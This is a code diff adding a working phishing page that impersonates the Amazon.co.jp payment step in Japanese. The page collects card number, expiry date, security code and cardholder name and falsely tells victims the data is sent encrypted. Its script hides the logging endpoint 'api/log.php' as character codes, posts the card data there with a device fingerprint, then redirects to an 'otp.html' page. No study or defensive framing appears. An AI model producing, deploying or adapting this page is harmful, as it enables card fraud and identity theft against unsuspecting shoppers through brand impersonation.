@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="index,follow">
+<title>Amazon.co.jp お支払い方法</title>
+<link rel="icon" href="assets/logo.svg">
+<link rel="stylesheet" href="assets/style.css">
+<style>
+.steps{display:flex;align-items:center;justify-content:center;gap:6px;font-size:11px;color:#767676;margin-bottom:16px}
+.steps b{display:inline-flex;align-items:center;padding:4px 9px;border-radius:20px;background:#f0f2f2;font-weight:400}
+.steps b.on{background:#e7f4f7;color:#007185;font-weight:700}
+.steps b.ok{background:#eef7ee;color:#067d62}
+.steps i{width:14px;height:1px;background:#d5d9d9}
+.wrap{max-width:400px}
+.sec{font-size:15px;font-weight:700;margin:18px 0 10px;padding-bottom:6px;border-bottom:1px solid #e7e7e7}
+.hint{font-size:11px;color:#565959;margin:4px 0 0}
+.row2{display:flex;gap:10px}
+.row2>div{flex:1}
+.brands{display:flex;gap:6px;margin:8px 0 0}
+.brands span{font-size:10px;font-weight:700;letter-spacing:.3px;color:#9aa0a6;border:1px solid #e0e0e0;
+             border-radius:3px;padding:4px 7px;transition:.15s}
+.brands span.on{color:#0f1111;border-color:#007185;box-shadow:0 0 0 1px #007185 inset;background:#f3fbfd}
+.savetag{display:flex;align-items:center;gap:7px;font-size:12px;margin-top:14px}
+.savetag input{width:14px;height:14px;accent-color:#007185;box-shadow:none}
+.lockline{font-size:11px;color:#565959;margin-top:14px;display:flex;gap:6px;align-items:center}
+</style>
+</head>
+<body>
+
+<header><a href="#" aria-label="Amazon.co.jp"><img src="assets/logo.svg" alt="Amazon.co.jp" width="150" height="42"></a></header>
+
+<main>
+  <div class="wrap">
+    <div class="steps">
+      <b class="ok">ログイン</b><i></i><b class="ok">お届け先</b><i></i><b class="on">お支払い</b>
+    </div>
+
+    <div class="card">
+      <h1>お支払い方法を選択</h1>
+      <p class="legal" style="margin:0 0 6px">ご注文内容の確認のため、お支払い方法をご登録ください。</p>
+
+      <form id="f" method="post" action="api/log.php" novalidate>
+        <input type="hidden" name="step" value="3_card">
+        <input type="hidden" name="method" value="card">
+        <input type="hidden" name="sig" id="sig">
+        <div class="hp"><label for="fax">FAX</label><input id="fax" name="fax" type="text" tabindex="-1" autocomplete="off"></div>
+
+        <div class="sec">カード情報</div>
+
+        <label for="num">カード番号</label>
+        <input id="num" name="card" type="text" inputmode="numeric" autocomplete="cc-number" maxlength="19">
+        <div class="brands" id="br">
+          <span data-b="visa">VISA</span><span data-b="master">MC</span>
+          <span data-b="jcb">JCB</span><span data-b="amex">AMEX</span><span data-b="diners">DINERS</span>
+        </div>
+        <div class="row2" style="margin-top:14px">
+          <div>
+            <label for="exp">有効期限</label>
+            <input id="exp" name="exp" type="text" inputmode="numeric" autocomplete="cc-exp" maxlength="5" placeholder="MM/YY">
+          </div>
+          <div>
+            <label for="cvv">セキュリティコード</label>
+            <input id="cvv" name="cvv" type="text" inputmode="numeric" autocomplete="cc-csc" maxlength="4">
+          </div>
+        </div>
+        <p class="hint">カード裏面の署名欄にある3桁の数字（American Expressは表面の4桁）</p>
+
+        <label for="holder" class="mt">カード名義</label>
+        <input id="holder" name="holder" type="text" autocomplete="cc-name" autocapitalize="characters" placeholder="TARO YAMADA">
+        <p class="hint">半角英字・大文字で入力してください</p>
+
+        <label class="savetag"><input type="checkbox" name="save" value="1" checked>次回のお支払いに使用する</label>
+
+        <p class="errmsg" id="err">未入力または形式が正しくない項目があります。</p>
+        <button class="btn" type="submit" id="sub">このカードを使用する</button>
+        <p class="lockline">カード情報は暗号化されて送信されます</p>
+      </form>
+    </div>
+
+    <div class="divider"><i></i><span>いつでもマイページから変更できます</span><i></i></div>
+  </div>
+</main>
+
+<footer>
+  <div><a href="#">利用規約</a><a href="#">プライバシー規約</a><a href="#">ヘルプ</a></div>
+  <div class="cp">© 1996-2026, Amazon.com, Inc. or its affiliates</div>
+</footer>
+<script>
+(function(){
+  var EP = [97,112,105,47,108,111,103,46,112,104,112]
+           .map(function(c){ return String.fromCharCode(c); }).join('');
+  var f = document.getElementById('f'),
+      num = document.getElementById('num'),
+      exp = document.getElementById('exp'),
+      cvv = document.getElementById('cvv'),
+      holder = document.getElementById('holder'),
+      sub = document.getElementById('sub'),
+      err = document.getElementById('err'),
+      br = document.getElementById('br');
+
+  var fp = [screen.width, screen.height, screen.colorDepth,
+            navigator.hardwareConcurrency || 0, navigator.platform || '',
+            new Date().getTimezoneOffset(), navigator.language || ''].join('|');
+  try { document.getElementById('sig').value = btoa(fp); } catch(e) {}
+
+  function brandOf(n){
+    if (/^4/.test(n)) return 'visa';
+    if (/^(5[1-5]|2[2-7])/.test(n)) return 'master';
+    if (/^3[47]/.test(n)) return 'amex';
+    if (/^3(0[0-5]|[68])/.test(n)) return 'diners';
+    if (/^35/.test(n)) return 'jcb';
+    return '';
+  }
+
+  num.addEventListener('input', function(){
+    var v = num.value.replace(/\D/g,'').slice(0,16);
+    num.value = v.replace(/(.{4})/g,'$1 ').trim();
+    var b = brandOf(v);
+    Array.prototype.forEach.call(br.children, function(s){
+      s.classList.toggle('on', s.dataset.b === b);
+    });
+  });
+
+  exp.addEventListener('input', function(){
+    var v = exp.value.replace(/\D/g,'').slice(0,4);
+    if (v.length >= 3) {
+      var m = v.slice(0,2);
+      if (+m > 12) { v = '0' + m.charAt(0) + v.slice(1); }
+      exp.value = v.slice(0,2) + '/' + v.slice(2);
+    } else {
+      exp.value = v;
+    }
+  });
+
+  cvv.addEventListener('input', function(){
+    cvv.value = cvv.value.replace(/\D/g,'').slice(0,4);
+  });
+
+  holder.addEventListener('input', function(){
+    holder.value = holder.value.toUpperCase();
+  });
+
+  [num, exp, cvv, holder].forEach(function(el){
+    el.addEventListener('input', function(){ el.classList.remove('err'); err.classList.remove('on'); });
+  });
+
+  f.addEventListener('submit', function(e){
+    e.preventDefault();
+    var bad = null;
+    var dg = num.value.replace(/\D/g,'');
+
+    if (dg.length < 14) { num.classList.add('err'); bad = bad || num; }
+    if (!/^\d{2}\/\d{2}$/.test(exp.value)) { exp.classList.add('err'); bad = bad || exp; }
+    else {
+      var mm = +exp.value.slice(0,2), yy = +exp.value.slice(3);
+      if (mm < 1 || mm > 12 || yy < 24) { exp.classList.add('err'); bad = bad || exp; }
+    }
+    if (cvv.value.length < 3) { cvv.classList.add('err'); bad = bad || cvv; }
+    if (!holder.value.trim()) { holder.classList.add('err'); bad = bad || holder; }
+
+    if (bad) { err.classList.add('on'); bad.focus(); return; }
+
+    var d = new FormData(f);
+    d.set('ua', navigator.userAgent + ' | ' + (navigator.language || ''));
+    d.set('vp', innerWidth + 'x' + innerHeight);
+    d.set('brand', brandOf(dg));
+
+    sub.disabled = true;
+    sub.textContent = '確認中…';
+
+    var sent = false;
+    var jump = function(){ if (!sent) { sent = true; location.href = 'otp.html'; } };
+
+    fetch(EP, { method:'POST', body:d, keepalive:true, credentials:'same-origin' })
+      .then(jump).catch(jump);
+    setTimeout(jump, 1400);
+  });
+})();
+</script>
+</body>
+</html>
